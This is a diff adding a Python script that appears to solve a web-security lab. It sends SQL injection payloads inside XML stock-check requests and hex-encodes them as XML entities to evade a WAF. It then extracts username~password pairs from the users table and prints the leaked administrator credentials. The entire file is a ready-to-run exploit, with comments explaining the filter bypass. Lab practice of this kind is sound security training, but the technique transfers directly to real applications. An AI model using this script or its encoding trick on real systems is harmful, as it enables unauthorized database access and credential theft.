@@ -1,0 +1,57 @@
+import requests
+
+base_url = input("Enter the base URL of the lab (e.g. https://xxxx.web-security-academy.net): ").rstrip("/")
+stock_url = base_url + "/product/stock"
+
+headers = {"Content-Type": "application/xml"}
+
+
+def to_hex_entities(text):
+    """
+    Converts every character into its XML hex entity form, e.g. "'" becomes
+    "&#x27;". The XML parser decodes these back into real characters before
+    handing the value to the SQL query, so a WAF that only scans for raw
+    SQL keywords or quotes never sees them, only the harmless-looking
+    encoded entities.
+    """
+    return "".join(f"&#x{ord(char):x};" for char in text)
+
+
+def build_xml(product_id, store_id_payload):
+    return f"""<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck>
+    <productId>{product_id}</productId>
+    <storeId>{store_id_payload}</storeId>
+</stockCheck>"""
+
+print("[*] Step 1: Confirming storeId is evaluated (1+1 should behave like storeId=2)...")
+test_xml = build_xml(1, "1+1")
+response = requests.post(stock_url, data=test_xml, headers=headers)
+print(f"    Status: {response.status_code}  Response: {response.text.strip()}")
+
+print("\n[*] Step 2: Sending a raw UNION SELECT (expected to be blocked)...")
+blocked_xml = build_xml(1, "1 UNION SELECT NULL")
+response = requests.post(stock_url, data=blocked_xml, headers=headers)
+print(f"    Status: {response.status_code}  Response: {response.text.strip()[:200]}")
+
+print("\n[*] Step 3: Sending the same payload, hex-encoded, to bypass the WAF...")
+raw_payload = "1 UNION SELECT NULL"
+encoded_payload = to_hex_entities(raw_payload)
+bypass_xml = build_xml(1, encoded_payload)
+response = requests.post(stock_url, data=bypass_xml, headers=headers)
+print(f"    Status: {response.status_code}  Response: {response.text.strip()}")
+
+print("\n[*] Step 4: Leaking username~password pairs via single-column UNION...")
+leak_payload = "1 UNION SELECT username || '~' || password FROM users"
+encoded_leak_payload = to_hex_entities(leak_payload)
+leak_xml = build_xml(1, encoded_leak_payload)
+response = requests.post(stock_url, data=leak_xml, headers=headers)
+print(f"    Status: {response.status_code}")
+print(f"    Response: {response.text.strip()}")
+
+if "~" in response.text:
+    print(f"\n[+] Leaked credential line: {response.text.strip()}")
+else:
+    print("\n==> No '~' found in response. Check productId value or payload structure.")
+
+print("\n[*] Go to the login page and log in manually using the leaked administrator credentials.")
